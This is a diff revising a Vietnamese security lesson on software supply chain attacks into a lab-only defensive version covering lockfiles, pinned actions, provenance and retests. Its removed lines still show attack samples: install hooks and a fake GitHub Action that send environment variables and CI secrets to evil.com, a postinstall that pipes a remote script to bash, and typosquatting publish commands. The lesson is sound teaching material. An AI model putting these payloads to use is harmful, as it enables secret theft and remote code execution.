@@ -1,11 +1,49 @@
+---
+schema_version: 1
+id: WEB-A03-SUPPLY-CHAIN-ATTACKS
+title: "Supply Chain Attacks (CI/CD Pipeline)"
+slug: supply-chain-attacks
+level: intermediate
+estimated_minutes: 50
+prerequisites:
+  - http-fundamentals
+  - authorized-security-testing
+owasp:
+  - A08:2025
+cwe:
+  - CWE-829
+content_status: technical-review
+payload_status: static-verified
+last_verified: null
+---
+
 # Supply Chain Attacks (CI/CD Pipeline)
 
-> **CWE**: CWE-829 | **Phân loại**: Supply Chain
+> [!CAUTION]
+> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.
 
-## Kiến thức Nền tảng
-Hãy tưởng tượng bạn đang xây dựng một ngôi nhà. Thay vì tự mình đúc từng viên gạch, rèn từng chiếc đinh hay chế tạo xi măng từ đầu, bạn sẽ ra cửa hàng vật liệu xây dựng để mua các sản phẩm làm sẵn về lắp ghép. Ngôi nhà của bạn sẽ được hoàn thành rất nhanh chóng. Thế nhưng, nếu một kẻ xấu lẻn vào nhà máy sản xuất gạch và trộn thuốc nổ vào đất sét, hoặc đánh tráo những chiếc đinh thép thành đinh sắt rỗng, ngôi nhà của bạn dù được xây dựng đúng kỹ thuật đến đâu cũng sẽ đứng trước nguy cơ đổ sập. 
+## 1. Mục tiêu học tập
 
-Trong phát triển phần mềm hiện đại cũng vậy. Một ứng dụng thông thường có tới **80-90% mã nguồn đến từ các thư viện mã nguồn mở bên thứ ba** (như npm cho Node.js, PyPI cho Python). Quy trình từ khi lập trình viên viết code, tải các thư viện này, chạy qua hệ thống tự động để kiểm tra, đóng gói, cho đến khi đưa sản phẩm lên mạng được gọi là **Chuỗi cung ứng phần mềm** (Software Supply Chain). Mỗi bước trong chuỗi này — từ lúc tải thư viện, chạy hệ thống xây dựng tự động (CI/CD pipeline như GitHub Actions), đến lúc đóng gói ứng dụng (Docker) — đều là những mắt xích vô cùng quan trọng. Nếu một mắt xích bị kẻ xấu can thiệp và chèn mã độc vào, toàn bộ ứng dụng của bạn sẽ bị nhiễm độc ngay từ trong trứng nước.
+Sau bài học, bạn có thể:
+
+- Giải thích Supply Chain Attacks (CI/CD Pipeline) bằng root cause thay vì chỉ mô tả hậu quả.
+- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
+- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
+- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.
+
+## 2. Kiến thức cần có
+
+- Dependency graph, build pipeline và artifact provenance.
+
+- Registry resolution, lockfile và lifecycle script.
+
+- Trust boundary giữa source, CI runner, registry và deployment.
+
+## 3. Kiến thức nền tảng
+
+Hãy tưởng tượng bạn đang xây dựng một ngôi nhà. Thay vì tự mình đúc từng viên gạch, rèn từng chiếc đinh hay chế tạo xi măng từ đầu, bạn sẽ ra cửa hàng vật liệu xây dựng để mua các sản phẩm làm sẵn về lắp ghép. Ngôi nhà của bạn sẽ được hoàn thành rất nhanh chóng. Thế nhưng, nếu một kẻ xấu lẻn vào nhà máy sản xuất gạch và trộn thuốc nổ vào đất sét, hoặc đánh tráo những chiếc đinh thép thành đinh sắt rỗng, ngôi nhà của bạn dù được xây dựng đúng kỹ thuật đến đâu cũng sẽ đứng trước nguy cơ đổ sập. [S8]
+
+Chuỗi cung ứng phần mềm gồm source, dependency, công cụ build, pipeline, artifact và các dịch vụ tham gia đưa phần mềm tới môi trường chạy. Tỷ lệ mã bên thứ ba thay đổi mạnh theo sản phẩm nên bài không dùng một con số phần trăm chung. Root cause cần chỉ rõ trust boundary nào chấp nhận source/artifact không được phê duyệt, không được khóa hoặc thiếu provenance/integrity phù hợp. [S2], [S8]
 
 Một pipeline CI/CD điển hình hoạt động như sau:
 
@@ -18,91 +56,90 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4        # Pull source code
-      - run: npm install                  # Install dependencies from registry
+      - run: npm install                  # May update the lockfile/dependency tree
       - run: npm run build                # Build application
       - run: npm test                     # Run tests
       - run: docker build -t myapp .      # Create container image
       - run: docker push registry/myapp   # Push to artifact registry
 ```
 
-Mỗi bước trên đều là một điểm mà attacker có thể can thiệp: từ việc chèn mã độc vào dependency, đến việc compromise GitHub Action, hay thay đổi base Docker image.
+Mỗi bước trên đều là một điểm mà attacker có thể can thiệp: từ việc chèn mã độc vào dependency, đến việc compromise GitHub Action, hay thay đổi base Docker image. [S8]
 
-## Mô tả lỗ hổng
-Lỗ hổng **Tấn công chuỗi cung ứng** (Supply Chain Attack) xảy ra khi kẻ tấn công không tìm cách hack trực tiếp vào hệ thống phòng thủ của bạn, mà đi đường vòng bằng cách **tấn công vào các thành phần bên ngoài** mà bạn hoàn toàn tin tưởng và sử dụng hàng ngày.
+## 4. Mô tả và nguyên nhân gốc
+
+Lỗ hổng **Tấn công chuỗi cung ứng** (Supply Chain Attack) xảy ra khi kẻ tấn công không tìm cách hack trực tiếp vào hệ thống phòng thủ của bạn, mà đi đường vòng bằng cách **tấn công vào các thành phần bên ngoài** mà bạn hoàn toàn tin tưởng và sử dụng hàng ngày. [S8]
 
 Đây là một trong những mối đe dọa nguy hiểm nhất hiện nay vì các nhà phát triển thường có tâm lý tin tưởng mù quáng vào các gói thư viện phổ biến hoặc các công cụ tự động. Kẻ tấn công có thể sử dụng nhiều chiêu trò tinh vi:
 - **Dependency Confusion (Nhầm lẫn thư viện)**: Lợi dụng sơ hở trong cấu hình để lừa máy chủ tải một thư viện độc hại có trùng tên với thư viện nội bộ của công ty nhưng được đẩy phiên bản (version) lên mức siêu cao trên các kho lưu trữ công cộng.
 - **Typosquatting (Đặt tên gần giống)**: Đăng ký các gói thư viện có tên viết sai chính tả gần giống các thư viện nổi tiếng (như `lodahs` thay vì `lodash`) để chờ đợi các lập trình viên gõ nhầm và tải về.
 - **Compromised Maintainer (Chiếm đoạt tài khoản nhà phát triển)**: Hack tài khoản của người quản trị một thư viện phổ biến để âm thầm cài cắm mã độc vào bản cập nhật tiếp theo.
-- **CI/CD Poisoning (Đầu độc hệ thống tự động)**: Chèn các đoạn script độc hại vào các cấu hình tự động xây dựng để đánh cắp các mật khẩu và khóa bảo mật (secrets) của doanh nghiệp.
+- **CI/CD Poisoning (Đầu độc hệ thống tự động)**: Chèn các đoạn script độc hại vào các cấu hình tự động xây dựng để đánh cắp các mật khẩu và khóa bảo mật (secrets) của doanh nghiệp. [S8]
 
-## Cơ chế tấn công
-### 1. Dependency Confusion Attack
 
-```python
-# setup.py - Malicious package uploaded to public PyPI
-# Package name matches internal company package "mycompany-auth"
-from setuptools import setup
-import os
+## 5. Mô hình đe dọa và điều kiện khai thác
 
-# Exfiltrate environment variables during install
-os.system(f"curl https://evil.com/collect?data=$(env | base64)")
+- **Tài sản:** source, dependency graph, build artifact và CI secret synthetic.
 
-setup(
-    name="mycompany-auth",       # Same name as internal package
-    version="99.0.0",            # Higher version forces auto-upgrade
-    packages=["mycompany_auth"],
-)
-```
+- **Actor:** maintainer/dependency/CI action không tin cậy trong fixture; không publish package công khai.
 
-### 2. Typosquatting Attack
+- **Trust boundary:** npm registry resolution, package-lock integrity và GitHub Actions reference.
 
+- **Điều kiện cần:** nguồn/version không pin hoặc provenance/integrity không được kiểm tra trước build.
+
+- **Môi trường:** npm 10.x, cache/registry loopback, workflow parser local, lifecycle scripts tắt.
+
+Scanner advisory là tín hiệu; bằng chứng phải nối đúng package/version/resolution path với artifact fixture. [S2]
+
+## 6. Cơ chế tấn công
+
+Resolver/build runner lấy dependency hoặc action theo tên/tag/registry có thể thay đổi. Thiếu lock/digest/provenance làm artifact không được review đi vào build và kế thừa quyền CI. [S2]
+
+## 7. Kiểm thử trong lab được ủy quyền
+
+1. **Setup:** tạo project disposable với lockfile/cache và registry 127.0.0.1; chặn outbound.
+2. **Baseline:** npm ci --offline tái tạo dependency tree pinned.
+3. **Thao tác:** đổi registry/version/action ref trong bản sao fixture rồi so diff lockfile/tree; không chạy lifecycle script.
+4. **Expected result:** gate phát hiện nguồn hoặc version không pin; cấu hình sửa chỉ resolve artifact đã khóa.
+5. **Boundary:** kiểm tra transitive dependency, lockfile drift và cache miss fail-closed.
+6. **Cleanup:** xóa project/cache fixture và dependency-tree.json.
+
+## 8. Payload và phạm vi áp dụng
+
+Các block dưới đây được giữ để technical review.
+
+`static-verified` chỉ xác nhận cấu trúc và annotation đã qua gate tĩnh.
+
+Trạng thái này không chứng minh payload hoạt động trên mọi phiên bản.
+
+Trước khi chạy, phải đối chiếu context, điều kiện, encoding, expected result và risk.
+
+Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.
+
+### Kiểm tra cấu hình dependency trong lab offline
+
+Lesson không phát hành mã đăng package giả lên public registry, post-install tải shell script hoặc workflow trích xuất secret. Những hành vi đó có thể tác động người dùng thật và không cần thiết để chứng minh root cause. Ví dụ cốt lõi chỉ kiểm tra lockfile, registry và dependency tree của fixture local. [S2]
+
+<!-- payload-id: WEB-A03-SUPPLY-CHAIN-ATTACKS-001 -->
+<!-- context: npm 10.x; disposable project with a populated local cache and package-lock.json; secure-build model [S8] -->
+<!-- prerequisites: run with outbound network disabled; registry is the local fixture at 127.0.0.1 -->
+<!-- encoding: UTF-8 shell source; package-lock.json and dependency-tree.json are UTF-8 JSON generated by npm 10.x -->
+<!-- expected-result: npm reports the local registry, npm ci uses the lockfile/cache, and dependency-tree.json records resolved versions -->
+<!-- risk: non-destructive -->
+<!-- runnable: false -->
+<!-- validation: static-verified -->
+<!-- sources: S2 -->
+<!-- last-verified: 2026-07-17 -->
 ```bash
-# Attacker registers similar package names on npm
-npm publish colo-rs        # Target: colors (180M downloads/week)
-npm publish reqeusts       # Target: requests
-npm publish electorn       # Target: electron
+# Inspect the configured source before resolving dependencies
+npm config get registry
+
+# Install exactly from the lockfile without lifecycle scripts or network access
+npm ci --ignore-scripts --offline
+npm ls --all --json > dependency-tree.json
 ```
 
-### 3. CI/CD Pipeline Poisoning
+## 9. Code dễ bị lỗi và code an toàn
 
-```yaml
-# Malicious GitHub Action that steals secrets
-name: "Fake Code Quality Check"
-runs:
-  using: "composite"
-  steps:
-    - run: |
-        # Steal all repository secrets and tokens
-        curl -X POST https://evil.com/exfil \
-          -d "secrets=${{ toJSON(secrets) }}" \
-          -d "github_token=${{ github.token }}"
-      shell: bash
-```
-
-### 4. Malicious postinstall Script
-
-```json
-{
-  "name": "totally-legit-package",
-  "version": "1.0.0",
-  "scripts": {
-    "postinstall": "node -e \"require('child_process').exec('curl https://evil.com/shell.sh | bash')\""
-  }
-}
-```
-
-## Biện pháp phòng thủ
-- **Tóm tắt**: Phòng chống các cuộc tấn công chuỗi cung ứng bằng cách khóa và xác minh tính toàn vẹn của các thư viện phụ thuộc, ghim phiên bản cụ thể, sử dụng registry nội bộ, ký/ghim các action CI/CD và liên tục thực hiện audit.
-- **Các bước chi tiết**:
-  - **Khóa các thư viện phụ thuộc (Lock dependencies)**: luôn commit các file khóa như `package-lock.json`, `Pipfile.lock`, `go.sum` và xác minh mã băm toàn vẹn (integrity hashes).
-  - **Ghim phiên bản cụ thể (Pin specific versions)**: không sử dụng các dải phiên bản động như `^` hoặc `~`, hãy ghim phiên bản chính xác.
-  - **Sử dụng registry nội bộ (Scoped registries)**: cấu hình `.npmrc` để đảm bảo các gói nội bộ chỉ được tải từ registry riêng tư.
-  - **Ghim các action CI/CD theo SHA**: sử dụng mã băm commit (commit SHA) thay vì tag phiên bản cho các GitHub Actions.
-  - **Thường xuyên quét và kiểm tra (Regular audits)**: chạy các công cụ quét lỗ hổng như `npm audit`, `pip-audit`, `trivy` trong pipeline CI/CD.
-  - **Khung SLSA (SLSA Framework)**: áp dụng Supply-chain Levels for Software Artifacts để xác minh nguồn gốc và quy trình xây dựng phần mềm.
-
-## Code Example
 ```yaml
 # ❌ VULNERABLE: Unpinned dependencies and actions
 name: Build
@@ -113,7 +150,7 @@ jobs:
     steps:
       - uses: actions/checkout@main           # Mutable tag - can be hijacked
       - uses: some-random-org/action@v1       # Unverified third-party action
-      - run: npm install                       # No integrity verification
+      - run: npm install                       # Can rewrite the lockfile/tree during CI
       - run: pip install mycompany-auth        # No source registry specified
 ```
 
@@ -127,44 +164,96 @@ jobs:
     permissions:
       contents: read                           # Minimal permissions
     steps:
-      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # Pinned by SHA
-      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
+      - uses: actions/checkout@<reviewed-full-commit-sha>  # Update through a reviewed bot PR
+      - uses: actions/setup-node@<reviewed-full-commit-sha>
         with:
           node-version-file: '.nvmrc'
-          registry-url: 'https://npm.mycompany.com'  # Private registry for scoped packages
-      - run: npm ci --ignore-scripts           # Use lockfile, skip postinstall scripts
-      - run: npm audit --audit-level=high      # Fail on high-severity vulnerabilities
+          registry-url: 'http://127.0.0.1:4873'       # Local registry in this fixture
+      - run: npm ci --ignore-scripts           # Fail on package/lock mismatch; use locked tree
       - run: |
           # Verify SLSA provenance of critical dependencies
           slsa-verifier verify-artifact myapp.tar.gz \
             --provenance-path myapp.intoto.jsonl \
-            --source-uri github.com/myorg/myapp
+            --source-uri github.com/lab-owner/lab-app
 ```
 
 ```ini
 # .npmrc - Scoped registry configuration
-@mycompany:registry=https://npm.mycompany.com/
-//npm.mycompany.com/:_authToken=${NPM_TOKEN}
+@lab:registry=http://127.0.0.1:4873/
 engine-strict=true
 ignore-scripts=true
 ```
 
+`package-lock.json` khóa cây dependency và chứa trường `integrity` cho artifact, còn `npm ci` từ chối khi `package.json` không khớp lockfile và không tự sửa lockfile. Điều này giúp build lặp lại và phát hiện bytes khác digest đã review; nó không tự chứng minh publisher đáng tin hoặc artifact có provenance đúng, nên registry policy và provenance verification vẫn là kiểm soát riêng. [S6], [S7]
 
-## Xem thêm
+## 10. Phát hiện
+
+- Tái tạo build trong fixture, ghi resolved artifact/digest và so sánh với lock/provenance mong đợi. [S8]
+
+- Review nguồn dependency, CI credential, mutable ref và quyền chạy lifecycle script. [S8]
+
+- Lưu SBOM/provenance/build log đã redaction; không chạy package không tin cậy ngoài sandbox.
+
+## 11. Phòng thủ
+
+### Kiểm soát bắt buộc
+
+- Xác định nguồn tin cậy, pin artifact/digest và xác minh provenance trước build/deploy. [S8]
+
+- Bảo vệ CI identity, secret và quyền publish theo least privilege. [S8]
+
+### Defense-in-depth
+
+- SCA/SBOM hỗ trợ inventory và triage, không chứng minh artifact vô hại.
+
+- Cô lập build và giới hạn outbound network/lifecycle script.
+
+## 12. Retest
+
+- **Positive:** build dùng đúng registry, lockfile và artifact digest được duyệt.
+
+- **Negative:** digest/publisher/provenance sai làm pipeline fail closed.
+
+- **Boundary:** transitive dependency, mutable tag, cache cũ và multi-registry.
+
+- **Telemetry:** đối chiếu build attestation, dependency tree và deploy digest.
+
+## 13. Sai lầm thường gặp
+
+- Chỉ pin version trong manifest mà không khóa transitive graph.
+
+- Tin tên package hoặc TLS registry là provenance.
+
+- Cho CI token quyền publish/deploy quá rộng.
+
+- Chạy lifecycle script không tin cậy trên runner có secret.
+
+## 14. Tóm tắt và checklist
+
+- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
+- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
+- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
+- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
+- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
+- [ ] Positive, negative, boundary case và telemetry đã qua retest.
+- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
+- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.
+
+## 15. Giải thích thuật ngữ
+
+- **Software supply chain:** thành phần, công cụ, dịch vụ và quy trình tạo/phân phối phần mềm. [S8]
+
+- **Provenance:** thông tin về nguồn gốc và các bước tạo ra artifact. [S8]
+
+- **Trust boundary:** điểm chuyển giao quyền hoặc artifact giữa source, CI, registry và deployment. [S8]
+
+## 16. Bài liên quan và đọc thêm
+
 - [Malvertising](../malvertising/) — Xem thêm bài học về Malvertising.
 
-## Nguồn tham khảo
-- OWASP: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
-- SLSA Framework: https://slsa.dev/
-- CWE-829: https://cwe.mitre.org/data/definitions/829.html
-- Snyk – Dependency Confusion: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/
+## 17. Tài liệu tham khảo
 
-## Giải thích thuật ngữ
-- **Software Supply Chain (Chuỗi cung ứng phần mềm)**: Tất cả các thành phần, thư viện, công cụ và quy trình tham gia vào việc xây dựng, đóng gói và triển khai phần mềm.
-- **Dependency (Thư viện phụ thuộc)**: Các gói mã nguồn hoặc thư viện do bên thứ ba phát triển mà ứng dụng của bạn cần tải về để hoạt động.
-- **CI/CD Pipeline**: Quy trình tự động hóa việc tích hợp, kiểm tra, xây dựng và triển khai phần mềm (Continuous Integration / Continuous Deployment).
-- **Dependency Confusion**: Cuộc tấn công lừa hệ thống tải gói mã độc từ kho lưu trữ công cộng thay vì gói nội bộ an toàn.
-- **Typosquatting**: Kỹ thuật tấn công đăng ký tên miền hoặc tên gói thư viện gần giống với các tên phổ biến nhằm lừa người dùng gõ sai chính tả.
-- **Artifact Registry**: Kho lưu trữ các sản phẩm phần mềm sau khi build (như file nén, container images) để chuẩn bị đem đi cài đặt.
-- **Postinstall Script**: Đoạn mã tự động chạy ngay sau khi một gói thư viện được tải và cài đặt xong trên máy tính.
-- **SLSA Framework (Supply-chain Levels for Software Artifacts)**: Bộ tiêu chuẩn bảo mật giúp bảo đảm tính toàn vẹn và xác minh nguồn gốc của các sản phẩm phần mềm trong suốt chuỗi cung ứng.
+- **[S2]** SLSA Framework. https://slsa.dev/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
+- **[S6]** npm CLI 10 documentation — package-lock.json. https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json/ — phiên bản: npm 10; truy cập: 2026-07-17.
+- **[S7]** npm CLI 10 documentation — npm ci. https://docs.npmjs.com/cli/v10/commands/npm-ci/ — phiên bản: npm 10; truy cập: 2026-07-17.
+- **[S8]** NIST SP 800-218 — Secure Software Development Framework 1.1. https://csrc.nist.gov/pubs/sp/800/218/final — phiên bản: 1.1; truy cập: 2026-07-18.
